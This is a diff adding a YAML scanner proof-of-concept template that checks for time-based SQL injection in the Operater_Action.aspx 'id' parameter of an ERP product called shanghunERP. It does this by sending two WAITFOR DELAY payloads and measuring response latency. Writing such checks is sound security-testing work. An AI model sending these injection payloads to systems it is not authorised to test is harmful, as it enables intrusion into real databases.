@@ -1,0 +1,25 @@
+name: poc-yaml-shanghunERP-Operater_Action.aspx-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:2%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /Dispatch/Operater_Action.aspx?action=TaskComplete&id=1%27WAITFOR+DELAY+%270:0:4%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487534&idx=1&sn=df3c2ff9a61d01030785bf4472cb9082&chksm=c267a51df5102c0bd32758fbff94a9e8c1cf8115b145e41378ba1901afca14bc05d43bb47804&token=1439003696&lang=zh_CN#rd
